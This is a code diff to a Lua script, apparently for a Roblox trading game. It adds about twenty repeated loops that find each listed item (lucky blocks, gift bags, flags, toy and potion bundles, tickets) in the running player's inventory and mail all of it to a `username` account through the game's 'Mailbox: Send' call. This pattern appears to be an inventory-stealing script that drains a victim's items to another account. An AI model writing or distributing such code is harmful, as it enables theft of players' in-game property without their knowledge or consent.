@@ -96,6 +96,323 @@ for i, v in pairs(pet) do
 end
 
 task.wait(2)
+
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Mini Lucky Block" then
+        local args = {
+            username,
+            "Lucky Block",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Mini Pinata" then
+        local args = {
+            username,
+            "Pinata",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Large Gift Bag" then
+        local args = {
+            username,
+            "Large Gift Bag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Gift Bag" then
+        local args = {
+            username,
+            "Gift Bag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "TNT Crate" then
+        local args = {
+            username,
+            "TNT Crate",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "TNT" then
+        local args = {
+            username,
+            "TNT",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Diamonds Flag" then
+        local args = {
+            username,
+            "Diamonds Flag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Hasty Flag" then
+        local args = {
+            username,
+            "Hasty Flag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Coins Flag" then
+        local args = {
+            username,
+            "Coins Flag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Magnet Flag" then
+        local args = {
+            username,
+            "Magnet Flag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Fortune Flag" then
+        local args = {
+            username,
+            "Fortune Flag",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Toy Bone" then
+        local args = {
+            username,
+            "Toy Bone",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Toy Ball" then
+        local args = {
+            username,
+            "Toy Ball",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Squeaky Toy" then
+        local args = {
+            username,
+            "Squeaky Toy",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Bundle O' Enchants" then
+        local args = {
+            username,
+            "Bundle O' Enchants",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Bundle O' Flags" then
+        local args = {
+            username,
+            "Bundle O' Flags",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Bundle O' Potions" then
+        local args = {
+            username,
+            "Bundle O' Potions",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Bundle O' Toys" then
+        local args = {
+            username,
+            "Bundle O' Toys",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Spinny Wheel Ticket" then
+        local args = {
+            username,
+            "Spinny Wheel Ticket",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Rainbow Swirl" then
+        local args = {
+            username,
+            "Rainbow Swirl",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Comet" then
+        local args = {
+            username,
+            "Comet",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
